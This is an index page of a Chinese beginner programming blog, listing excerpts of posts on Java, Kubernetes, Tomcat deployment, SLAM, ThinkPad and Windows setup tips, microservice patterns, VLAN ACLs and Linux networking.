<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b50f9ea792d8bb3efe42e9b2452ca41b/" rel="bookmark">
			Java入门到精通(干就完了)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、Java语言概述2、Java开发环境的准备:JDK简介、安装、常用命令3、Java入门程序3.1、Hello World3.2 常见问题3.3 Java程序的执行原理3.4 JDK组成、跨平台原理3.5 JDK安装后Path和Java_home环境变量 4、IDEA开发工具：简介、下载、安装4.1 简介4.2 下载4.3 IDEA开发工具：开发第一个程序4.4 IDEA字体、主题、背景色设置4.5 常用快捷键介绍4.6 IDEA工程、模块常用操作 5、Java基础语法5.1 注释5.2 字面量5.3 变量5.4 变量在计算机中的底层原理5.5 进制转换，八进制、十六进制5.6 数据类型5.7 关键字、标识符 6、关于Java语言基础知识我们需要学会什么？7、类型转换7.1 自动类型转换7.2 表达式的自动类型转换7.3 强制类型转换 8、运算符8.1 基本算数运算符8.2 +符号做连接符8.3 自增自减运算符8.4 赋值运算符8.5 关系运算符8.6 逻辑运算符8.7 三元运算符8.8 运算符优先级 9、API介绍、案例技术：键盘录入10、程序流程控制10.1 分支结构10.1.1 if分支10.1.2 switch分支 10.2 循环结构10.2.1 for循环10.2.2 while循环10.2.3 do-while循环10.2.4 死循环10.2.5 嵌套循环10.2.6 跳转关键字：break、continue 11、 随机数Random12、数组12.1 概述12.2 定义方式一、访问、注意事项12.3 定义方式二、元素默认值规则12.4 数组遍历12.5 数组案例12.5.1 元素求和12.5.2 数组求最值12.5.3 猜数字游戏12.5.4 随机排名12.5.5 数组排序 12.6 数组内存图、常见使用问题12.7 Debug工具 13、方法13.1 概述13.2 方法定义格式、常见问题13.3 方法案例13.3.1 求和13.3.2 判断奇偶数13.3.3 求最值 13.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b50f9ea792d8bb3efe42e9b2452ca41b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20148bfc6ba87ba0c1b32b0d84c7c40c/" rel="bookmark">
			Java 泛型： T和？的使用和区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.定义
T表示泛型，代表一种数据类型
?是通配符，表示不确定的数据类型
jdk为了便于理解，K代表键，V代表值，E代表枚举类型，T代表数据类型，这四个都是符号，只是表示了泛型的名称，换成其他字母也没问题，只不过要提前声明。
二.使用
通常得先在类里面声明了这个泛型
方法里面的参数就可以用泛型来表示了
&lt; T extends Record&gt;
&lt; ? extends Record&gt;
表示的是 限制 T , ? 类型 必须是Record的本类或者子类
注意：继承的父类或者是实现的接口里面的参数都必须是一个具体的类型
/** * * @param &lt;T&gt; Report record class * @param &lt;C&gt; Report context class */ public abstract class CrystalReportDataPrepare&lt;T extends Record, C extends CrystalReportContext&gt; implements DataPrepare&lt;C&gt; { @Override public ReportData prepareData(C reportContext) { return getCrystalReportData(reportContext); } private CrystalReportData getCrystalReportData(C reportContext) { CrystalReportData crystalReportData = new CrystalReportData(); ReportParams reportParams = reportContext.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20148bfc6ba87ba0c1b32b0d84c7c40c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5222c87dc9ddd8dca70d5c829065c88/" rel="bookmark">
			在Windows环境下配置及安装Nacos
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.mysql数据库已经安装与配置成功
如果没有装mysql，需要先进行安装及配置mysql
下载地址：Releases · alibaba/nacos · GitHuban easy-to-use dynamic service discovery, configuration and service management platform for building cloud native applications. - Releases · alibaba/nacoshttps://github.com/alibaba/nacos/releases
2.选择如图中选项进行下载
3.解压到安装的文件夹
我安装到了D盘下。
4.连接mysql数据库，创建nacos数据库
5、进入nacos安装的地址下conf文件中，找到nacos-mysql.sql 将文件中的sql语句，复制到数据库中运行sql
6、修改application.properties文件
7. 将cluster.conf.example的.example扩展名去掉
或者修改启动脚本
set MODE="cluster"修改为：standalone
7、启动nacos
nacos安装目录bin目录下的startup.cmd启动nacos
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/018034b185f1492d55df9d57b2a4ea8a/" rel="bookmark">
			【云原生之k8s】Pod 基础概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、资源限制
二、Pod 的两种使用方式
三、Pod 资源共享
四、底层容器Pause
1、Pause共享资源
1.1网络
1.2存储
1.3小结
2、Pause主要功能
3、Pod 与 Pause 结构的设计初衷
五、Pod容器的分类
1、基础容器（infrastructure container）
2、初始化容器（init container）
3、应用容器（main container）
六、操作示例
6.1、编写myapp.yaml
6.2、myapp.yaml配置资源
6.3、查看pod创建过程
6.5、编写myservice.yaml
6.6、创建myservice.yaml配置资源
6.7、编写mydb.yaml
6.8、创建mydb.yaml配置资源
6.9、chakan myapp-pod创建全过程
10、小结
七、镜像拉取策略（Image PullPolicy）
1、官方示例
2、不指定版本，查看默认拉取策略
2.1 不指定版本号创建pod
2.2 查看默认拉取策略
2.3 查看创建过程
3、测试案例（非循环命令）
3.1 创建测试案例mypod.yaml
3.2 生成mypod配置资源
3.3 查看创建过程
3.4 修改mypod.yaml
3.5 删除原有资源
3.6 更新资源
3.7 在node2节点使用curl查看头部信息
4、测试案例（循环命令）
4.1 修改mypod.yaml
4.2 生成新的 mypod.yaml 配置资源
4.3 查看pod状态
4.4 查看创建过程
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/018034b185f1492d55df9d57b2a4ea8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2ea167cd78ef3f6c89a366568ad2cff/" rel="bookmark">
			计算机视觉学习路线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机视觉学习路线 为了帮助小伙伴们更快更好的学习机器学习和深度学习这门课程，本人总结了一套具体的学习路线，以供参考，如下图。
具体的详细路线文字版，已经放入百度网盘中，可进行查阅翻看。内容包括学习安排以及进度安排，非常实用。
为了方便同学们能够快速的找到相关资料，本人花费很多精力才将所有资料整理完毕，保存在百度网盘中提供使用，链接如下，需要用的同学请自取。
链接：https://pan.baidu.com/s/12-poTSw7QykwFX2Evi3_0A 提取码：jwn4
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c697262cdb17610afd63f7e805d2b1c/" rel="bookmark">
			web服务器部署项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们在本地编写完自己的web应用后，我们通常会想到一个问题，怎么才可以访问到自己的程序呢 我也是新手，对服务器这种没概念，在公司里面被要求部署Java web项目，外网可以进行访问，我相信大部分的萌新一定很懵逼，然后就会各种百度，在各种以为自己要死的边缘试探，那么接下来实战开始： 我这边是公司提供的阿里云服务器，所以不需要自己去买，这个购买的这个方面我也不懂，第一步当然是远程连接控制我们的云主机服务器了，也就是远程电脑连接 一、win+R打开我们的运行，然后输入cmd进入到我们的控制台
二、进入到控制台后输入mstsc 点击回车开始远程连接
三、填入远程连接服务器的公网ip地址和服务器电脑的计算机名，具体怎么查看计算机名，我就不说了，很容易找，或者就去问公司人员直接要
四、将这里显示的用户名还有密码填好之后点击确定
五、就连接上去了。。。
------如果自己连接不成功，要么就是连接公网的ip不对或者用户名不对，或者是电脑远程的一些权限没有开放，具体可以百度。
------由于公司给我的服务器这边是空的，什么都没有装，JDK、Tomcat和MySQL只能自己去配置环境安装，如果有装好的，需要跟公司的人员沟通一下，不然造成什么后果就不好了。
------安装Tomcat和MySQL和配置环境变量都是跟在本地电脑配的步骤差不多，数据库如果用的是云数据库就不用在服务器里面安装数据库了，如果不是，那么安装数据库密码要与项目中配置的一致
jdk-8-64位：https://pan.baidu.com/s/1ntPcpj3BVaaFW-DlddQ1bA 领取码：1203
tomcat-8.5.47：https://pan.baidu.com/s/1VWPqQRHJtG_4WQ9BxGmrZg 领取码：1203
六、接下来我们把我们的项目打包成.war文件格式：
1.首先打开项目，右侧有个maven，打开，如图：
2.打开之后，展开Lifecycle，可以先点击clean清除缓存
3.然后点击package进行项目打包
4.出现下图的时候说明打包成功：
5.打包好的war包会放在target里面，（war包的名称要和你的访问路径里面的项目名称要保持一致）
七、将打包好的war包复制进服务器里的tomcat下的webapps下面（如果远程电脑不能直接复制，是因为没有设置一些权限）
八、进入Tomcat下的bin目录点击startup.bat，Tomcat就会开始启动
九、接下来就可以启动浏览器，输入IP地址或者域名加上网页名就可以外网访问了（http请求格式：ip地址：端口号/war包名称/某一个web页面名称）
十、将tomcat停下来然后把war包删除，否则再次启动时会重新加载，里面修改过的配置也会被重新加载。（删除的时候需要停下Tomcat然后进行操作，否则进行删除的时候Tomcat加载过的也会随着一起被删除)
以上就是今天要讲的内容，感谢关注！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ba46480b9bbae6a64e9ff0adab07497/" rel="bookmark">
			《视觉SLAM十四讲》学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一讲：预备知识
第二讲：经典视觉SLAM框架，传感器 前端VO 后端优化 回环检测 地图构建
第三讲：三维刚体运动，主要了解旋转矩阵，欧拉角，四元数，练习使用Eigon
第四讲：学习李群和李代数，定义及使用方式；练习使用Sophus操作
第五讲：针孔相机模型，图像在计算机中的表达；用OpenCV调用相机内外参
焦距f：光心到成像平面的距离 相机内参：f_x、f_y、c_x、c_y ---&gt;f_x, f_y表示像素坐标在u,v轴上缩放了多少倍 * 焦距f ---&gt;c_x，c_y表示像素坐标平移了多少 ---&gt;单目相机有：c_x≈image_width/2, c_y≈image_height/2 相机外参：R、t 双目相机基线：两相机光心距离 视差：uL-uR RGBD：不适用于室外，遇到透视不会反射，且很容易被干扰。 第六讲：非线性优化，包括状态估计理论基础，最小二乘问题，梯度下降法；使用Ceres和g2o进行曲线拟合实验
状态估计问题 (1)最大后验与最大似然 (2)最小二乘法 非线性最小二乘 (1)一阶和二阶梯度法 (2)高斯牛顿法 (3)列文伯格--马夸尔特方法 第七讲：基于特征点法视觉里程计，特征提取与匹配，对极几何约束的计算、PnP和ICP等。利用以上方法估计两个图像之间的运动。
1、特征点法（提取和匹配）： (1)特征点 (2)ORB特征 (3)特征匹配 最小化重投影误差： 2、2D-2D：（已知两张图像中一对匹配好的特征点） 矩阵自由度分析 -本质矩阵 -3x3矩阵，6个独立参数(3个线元素，3个角元素)，自由度6 -尺度等价，自由度-1 -自由度=5 -基础矩阵 -3x3矩阵，至少14个独立参数(4+4+6)，自由度9 -尺度等价，自由度-1 -矩阵秩=2，自由度-1 -自由度=7 -单应矩阵 -3x3矩阵，自由度9 -尺度等价，自由度-1 -自由度=8 (1)对极几何模型：本质矩阵E/基础矩阵F ---&gt;五点法估计E：E=t^R共有6个自由度(x,y,z,r,p,y)，但由于尺度等价性，故E实际上有5个自由度，最少5个点求解问题 ---&gt;八点法估计E：但是E内在性质是一种非线性性质，使用5点法需要线性化，最好只考虑尺度等价性，使用8对点来估计E (2)单应矩阵H模型 ---&gt;四点法估计H：自由度为8(尺度等价性)的单应矩阵H可以通过4对匹配特征点计算(公式只在特征点共面时成立) 注意： ---&gt;当**特征点共面，或者相机发生纯旋转**的时候，基础矩阵的自由度下降，出现**退化现象**。现实中的数据总包含一些噪声，这时候如果继续使用八点法求解基础矩阵，基础矩阵多余的自由度将会主要由噪声决定。为了能够避免退化现象造成的影响，通常我们会同时估计基础矩阵F和单应矩阵H，选择重投影误差比较小的那个作为最终的运动估计矩阵。 ---&gt;主要用E分解运动，H需要假设特征点在平面上。 ---&gt;E本身具有尺度等价性，通常对t进行归一化，令它的长度为1，因此会有尺度不确定性。 ---&gt;尺度不确定性：对t的归一化相当于固定了尺度，导致单目视觉的尺度不确定性，厘米还是米。对t乘以任意常数，对极约束依然成立 ---&gt;初始化：用于初始化的两帧之间需要有一定程度的平移t，而后的轨迹和地图都将以此步的平移为单位。 ---&gt;初始化的纯旋转：纯旋转导致t为0，这样E也是0，无法求解R。单目初始化不能只有纯旋转，必须要有一定平移。 ---&gt;多余8点的情况：倾向于用RANSAC (3)三角测量：估计空间点深度，需要一定平移，这样才有对极几何中的三角形 ---&gt;x1 X s1x1 = 0 = x1 X (s2Rx2+t) ---&gt;此时尺度还是不确定的(即只知道地图比例，不知道具体尺寸单位)。因为此时代入的R和t还是尺度丢失的 ---&gt;三角化的矛盾：平移太大特征匹配会失败，平移太小由于分辨率太小会使三角化精度不够大 ---&gt;尺度要由Sim(3)求解 https://blog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ba46480b9bbae6a64e9ff0adab07497/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acdc8fd94e6a756a8cc7994bb4b5d922/" rel="bookmark">
			Thinkpad电脑开机进入boot menu无法进入系统的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ThinkPad T460 ，可以更换SSD固态硬盘。TONY
Thinkpad电脑开机进入boot menu无法进入系统的解决方法
一、先从Bios设置开始，下面是我的配置过程（部分来源于网上）。
1、开机点击F1进入到bios界面。
2、进入Security—Secure Boot—Disabled。
如果不修改Secure boot选项为Disabled，在光驱引导时可能会出现报错。
3、进入Startup—UEFI/Legacy Boot选项，以下有两种选择：
1）UEFI/Legacy Boot选项选择成Both，UEFI/Legacy Boot Priority选择成UEFI First如第一幅图所示，否则安装系统时无法识别GPT分区，产生如第二幅图所示的报错“找不到驱动程序”。
（ps：本人是采用上面方法可以进入系统）
2）UEFI/Legacy Boot选择成UEFI Only，CSM选择成YES。
如果选择UEFI Only，需要把CSM（Compatibility Support Module）选择YES。可以理解成是UEFI的兼容模式。使用UEFI模式安装windows7系统，Windows7的系统光盘需要使用Windows7 SP1版本。
其实，进入Startup，单击Boot，在弹出的boot启动顺序表中，我们还可以用“-/ ”号对Thinkpad的启动顺序进行合理设置。比如可以按照你此时的需要，按照硬盘、光驱、U盘等进行排序。
Bios的设置如上，但结果还是一如既往，开机仍然停留在Boot menu界面上，进不了系统，怎么办呢？自然是对磁盘的引导分区开刀了。想起以前给某台式机装XP时，系统装好后，重启，出现“Press any key……”，晕菜之余，小手抖抖，给主分区重建了一下MBR分区表，搞定！这次，估计也是这个情况了。
二、停在boot menu界面的问题的最终解决办法。
用DiskGenius，给主分区重建MBR分区表，重启，Boot menu神奇地不出现了，顺利地进入win7，O(∩_∩)O~。（系统分区自然是一定要激活的）。
PS：win7只能运行在MBR类型的磁盘上面，所以要将ubuntu系统的gpt磁盘格式转换成MBR。GPT一般不能直接转换成MBR，所以，往往采用格式化硬盘的方法更改磁盘文件格式。
讲了这么多，最后才贴出解决“Thinkpad开机停在boot menu界面的问题”的解决方法，主要是想和大家一起分享Thinkpad Bios设置的方法。
附我的另一篇关于thinkpad开机异常的问题：
联想ThinkPad开机进不了系统的解决方式 近期重新装电脑，出现的问题
第1步 开机点击F1或F12进入到bios界面，这hinkPad一般是F1或F12，长按或不停按，听到"滴"一声，就可以进入了。
第2步 进入Security—Secure Boot—Disabled。修改Secure boot选项为Disabled。
第3步 进入Startup—UEFI/Legacy Boot选项，以下有两种选择：
1）UEFI/Legacy Boot选项选择成Both，UEFI/Legacy Boot Priority选择成UEFI First
2）UEFI/Legacy Boot选择成UEFI Only，CSM选择成YES。
如果还不行，可以考虑，如下：
ThinkPad T460s BIOS设置实现U盘启动_阿酷tony的博客-CSDN博客_t460s如何进入bios
--------------
与ThinkPad其他文章 ThinkPad T460s BIOS设置实现U盘启动_阿酷tony的博客-CSDN博客_t460s如何进入biosDiskGenius系统迁移(更换硬盘系统对拷)_阿酷tony的博客-CSDN博客_diskgenius克隆硬盘https://blog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acdc8fd94e6a756a8cc7994bb4b5d922/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/515a133d973deb8a7884d66530a13761/" rel="bookmark">
			用c语言实现整数加法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		刚开始学的小白，记录一下自己的思路。原创
1、首先是输入固定的整数，例如5+8=13这样。
开始固定头文件和主函数的组合
#include&lt;stdio.h&gt; int main() { int a=5；/*声明一个整形变量，存放5*/ int b=8;/*声明一个整形变量，存放8*/ int c;/*声明一个整形变量，存放c*/ c=a+b;/*将a+b赋值给c*/ printf （"结果是%d",c）；/*输出c*/ return 0； } 这只是固定的数字相加，我想如果是随意输入两个整数a,b相加的话，应该会使用什么方法输出得数？
2.
include&lt;stdio.h&gt; /*包含头文件*/ int add&lt;int a,int b&gt;;/*自定义add声明，此处声明函数，后面才能使用该函数，给出函数具体使用内容*/ int main()/*进入主函数*/ { int a;/*定义整数变量a，存储某个整数给a*/ int b;/*与上类同*/ int c; printf("输入一个整数\n");/*输出显示提示*/ scanf_s("%d",&amp;a)/*接受输入的整数 ，并保存输入的数值在a*/ printf ("再输入一个整数\n");/*输出显示提示*/ scanf_s("%d",&amp;a)/*存储b数值*/ c=add（a,b）;/*调用add函数，使用add函数计算和*/ printf("输出数字为%d"，c);/*输出结果*/ return 0; } int add(int a,int b);/*定义add函数，具体的实现相加这个过程*/ { int c=a+b;/*计算两数和，定义c,存储计算结果在c*/ return c;/*返回c的值，这样前面可以按照这个函数的过程计算并输出结果*/ } 这样的一个过程，很明显复杂很多。
对比增加的实现过程就是
1、定义增加函数，调用且定义这个函数。
2、同时不单单是声明一个变量，存储固定的数值，而是声明一个变量存储变量数值
3、增加了输入输出，就是输入存储的数，存进变量里最后调用函数计算结果
就像我们平时觉得固定的数1+1=2，而引申成3+4=？的一个过程。
主要是怕忘了，本人记忆力不是很好，方便记录，如果能给也在探索这个问题的同行一些帮助，实在荣幸。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afbdf30fd6d67af451b2d4fae4144f39/" rel="bookmark">
			部署基于docker和cri-dockerd的Kubernetes v1.25.3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
设定时钟同步 主机名称解析
禁用Swap设备
禁用默认的防火墙服务
安装程序包
安装cri-dockerd
安装kubelet、kubeadm和kubectl
安装kubelet、kubeadm和kubectl
整合kubelet和cri-dockerd
配置cri-dockerd
配置kubelet
初始化第一个主节点
初始化方式一
初始化方式二 初始化完成后的操作步骤 介绍
设定kubectl
部署网络插件
验证master节点已经就绪
添加节点到集群中
验证节点添加结果
测试应用编排及服务访问 相关命令 列：拉nginx
使用kubeadm部署Kubernetes集群的前提条件
支持Kubernetes运行的Linux主机，例如Debian、RedHat及其变体等
每主机2GB以上的内存，以及2颗以上的CPU各主机间能够通过网络无障碍通信独占的hostname、MAC地址以及product_uuid，主机名能够正常解析放行由Kubernetes使用到的各端口，或直接禁用iptables禁用各主机的上的Swap设备各主机时间同步 设定时钟同步 若节点可直接访问互联网，安装chrony程序包后，可直接启动chronyd系统服务，并设定其随系统引导而启动。随后，chronyd服务即能够从默认的时间服务器同步时间。
~# apt install chrony
~# systemctl start chrony.service 建议用户配置使用本地的的时间服务器，在节点数量众多时尤其如此。存在可用的本地时间服务器时，修改节点的/etc/chrony/chrony.conf配置文件，并将时间服务器指向相应的主机即可，配置格式如下
server CHRONY-SERVER-NAME-OR-IP iburst
主机名称解析 出于简化配置步骤的目的，本测试环境使用hosts文件进行各节点名称解析，文件内容如下所示。其中，我们使用kubeapi主机名作为API Server在高可用环境中的专用接入名称，也为控制平面的高可用配置留下便于配置的余地。 10.0.0.101 k8s-master01 k8s-master01.wang.org kubeapi.wang.org kubeapi 10.0.0.102 k8s-master02 k8s-master02.wang.org 10.0.0.103 k8s-master03 k8s-master03.wang.org 10.0.0.104 k8s-node01 k8s-node01.wang.org 10.0.0.105 k8s-node02 k8s-node02.wang.org 10.0.0.106 k8s-node03 k8s-node03.wang.org 禁用Swap设备 部署集群时，kubeadm默认会预先检查当前主机是否禁用了Swap设备，并在未禁用时强制终止部署过程。因此，在主机内存资源充裕的条件下，需要禁用所有的Swap设备，否则，就需要在后文的kubeadm init及kubeadm join命令执行时额外使用相关的选项忽略检查错误。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afbdf30fd6d67af451b2d4fae4144f39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13ac2579b5f0e5ea89fee858e70a70b0/" rel="bookmark">
			Win10 安装系统跳过创建用户，直接启用 Administrator
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 oobe 到创建用户那里
第一种方法：
按 shift+F10 打开 cmd输入 lusrmgr.msc 将 administrator 启用关闭 lusrmgr.msc 回到 cmd输入 taskmgr.exe 打开任务管理器结束进程 msoobe 第二种方法：
1、进入审记模式
Ctrl+Shift+F3 2、启用账户
在本地用户和组中选择用户，然后选择 Administrator，将账号已禁用去掉
3、替换 audit.exe
XCOPY %windir%\System32\svchost.exe %windir%\System32\oobe\audit.exe /X 4、重启电脑
shutdown -r -t 0 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/008f8288a1426e480845c0fc153130aa/" rel="bookmark">
			微服务中的熔断、降级与限流
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念 降级 先说说什么是降级,熔断和限流都要配合降级,降级通俗来讲就是Plan B,即当Plan A执行失败的时候,需要如何处理.可以直接返回失败,也可以转而调用另一个服务.
熔断 系统调用某个服务失败或者某种状态达到阈值的时候,自发的一种保护行为,通过限制调用端调用来实现.例如某个服务需要调用算法服务,算法服务总是返回错误时候,就需要限制对算法端的调用,以保护其他资源不被浪费
限流 限流是指在调用某个服务的时候,出于对系统的保护,按照某个业务维度的值统计达到阈值之后,进行的降级操作.
实现思想 不管是Spring 微服务生态的解决方案还是K8s的(Istio)方案,核心本质是代理.熔断和限流都需要有个平面来统计,就限制了不能有client本身触发,因此采用代理来实现 熔断实现 Hystirx框架下,本质上使用代理将客户端封装,封装后,在封装的位置实现统计与降级
Hystirx隔离策略
线程池:默认使用线程隔离策略,直接在线程池中获取新的线程来执行RPC.
缺点:增加计算开销,每个rpc都会被独立的线程执行.
适用于依赖网络访问的请求,只依赖内存缓存的情况下(线程级缓存)
信号量:在调用线程中执行,通过信号量进行隔离.适用于只依赖内存缓存且不涉及网络访问.
熔断器参数
requestVolumeThreshold滑动窗口大小,默认20errorThresholdPercentage错误率, 默认50%sleepWindowInMilliseconds熔断生效时间,默认5000:5s 限流实现 1、HyStrix中
线程隔离时,线程数+排队队列大小信号量隔离时,最大并发数限流 2、并发数量
QPS、并发连接数 3、总量
业务层中,限制某个资源量的总量 限流算法:
1、限制速率: 漏桶算法
2、限制总数: **令牌桶算法 ** 限制某个业务资源的count值,允许短时间突发
异步RPC
通过提升接口性能来提升系统并发处理能力
前提: 异步RPC之间不存在相互依赖
实例:
比如你的接口，内部调用了3个服务，时间分别为T1, T2, T3。如果是顺序调用，则总时间是T1 + T2 + T3；如果并发调用，总时间是Max(T1,T2,T3)。 一般成熟的RPC框架，本身都提高了异步化接口，Future或者Callback形式
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d3744e420690e0ecb55bebe9c40ff9e/" rel="bookmark">
			feign.FeignException: status 400 reading （后面是自己的具体的异常信息）异常解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		feign.FeignException: status 400 reading （后面是自己的具体的异常信息）异常解决方案 问题产生第一个问题：OpenFeign远程接口与调用者的接口参数是否一致，是否为空第二个问题：Header信息长度过长 或者 参数信息过长！（本人就是这个问题）第三个问题：参数没有使用注解指定第四个问题：方法没有指定请求方式 问题产生 在请求某个接口时， 在接口异常的情况下，一次正常返回异常信息，紧接着请求就会报feign.FeignException: status 400 reading xxx 异常的问题，具体问题如下几点： OpenFeign远程接口与调用者的接口参数是否一致，是否为空
传递的参数可能为空值
Header信息长度过长 或者 参数信息过长！！！！！
参数没有使用注解指定
方法没有指定请求方式
第一个问题：OpenFeign远程接口与调用者的接口参数是否一致，是否为空 查看接口问题，接口的提供与调用是否一样。如果默认没有传值，加入 required = false，不然会空值报错 第二个问题：Header信息长度过长 或者 参数信息过长！（本人就是这个问题） 修改内嵌tomcat的参数，内嵌tomcat对参数的默认限制是8K，例如：可以修改配置文件server.max-http-header-size=20480 提示：server.Tomcat.max-http-header-size=20480已经是过时的方法了，不可用，推荐使用server.max-http-header-size=20480 第三个问题：参数没有使用注解指定 @RequestParam(value = "xxx",required = false) String xxx 参数尽量统一一样，不要前端为Name，后端接收为name 小细节问题 第四个问题：方法没有指定请求方式 Feign 请求服务，在Controller 之上的 xxxMapping 的注解，如果使用 @RequestMapping 的话， 需要声明method 属性， 否则就会引发这个异常，例如：@RequestMapping(value="/...,method=RequestMethos.GET) 注意事项：只能使用@RequstMapping注解，不能使用GetMapping注解 ---------------------------细心从每一个小细节开始-------------------------
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/527f4748c167ddbca7c37814ef5d12d0/" rel="bookmark">
			对于ACL访问控制在vlan间设置的一些见解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查过许多篇文章以后，很多文章都得出了一个结论：
在vlan间的acl中当源地址段为应用 vlan接口的ip段时，就是用in方向；
当目的地址段为应用vlan接口的ip段时，就是用out方向;
这边对这个结论进行一个猜想：
首先我们需要知道一点点别的知识，这边在这边做一个简单的说明：
首先我们都知道，TCP/IP体系中存在四层，分别是： 应用层，传输层，网络层，链路层
我们如果要进行一个数据传输的话，数据处于应用层的话，落实在传输上面的话就是从上往下走进行一个数据封装，然后在进行一个对应的传输，然后这个时候当数据包到达预定位置以后，我们的数据报是要进行一个从下往上的解包操作的，这样才能从下往上在应用层拿到数据，所以这边就是一个数据封装与解包的过程。
好了这个时候我们的前置知识就已经说完了。然后这个时候如果说有两个网段，一个内网一个外网，像这样：
首先这个in跟out都是相对的，这个不用纠结。
然后这个时候如果说
我在网段1去ping一下网段2的主机，如果没有做任何的访问控制，在正常情况下，这个时候肯定是能通的，那这个时候我如果在网段2的vlan上的in口打了一个acl类似这样的：
permit IP any host 网段2的某一主机
这个时候由于acl访问控制默认拒绝所有，这个意图的话就很明显了，如果有去做实验的话，可以知道这个是ping不通这个host所指定的主机的，那如果将这个acl配置换到out口的话这个时候又是可以的，那这个时候我是不是可以说这个数据包没有进到这个vlan设备中所以不能走通，这个时候，我如果打一个ip any any应该就是可以的，有想法的可以去试试。
好了这边得出猜想，一个数据包走到vlan内部是会进行一个解析的，为了不配置出错，以及预防意外的情况，我们会将这个数据包放进vlan内部让他进行一个解析，然后解析过后这个数据包就要往对应的地方走，那么这个时候我们在vlan的out位置给他来一个限制的话，这个时候不就达到我们想要的效果 了，至于如果说你一定要配置在in口上的也可以，但是你会配置一个IP any any，放行所有，这个时候你觉得会放心嘛。这个范围可是很大的奥，至于配置在in口上要多一个ip any any，笔者认为这边是做了一个数据包解析的作用。
大体解析就是这些。
问题是到了这个vlan内部以后是不是真的会进行一个解包
这边只是笔者的一个猜想，作为一个路由小白，发现要学的东西还有很多，有错的话，还请多多指教。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98c0d3301e6d9b13b413dfa1a8508733/" rel="bookmark">
			【Linux网络编程】epoll进阶之水平模式和边沿模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		-------------&gt;【Linux系统编程/网络编程】(学习目录汇总) &lt;--------------
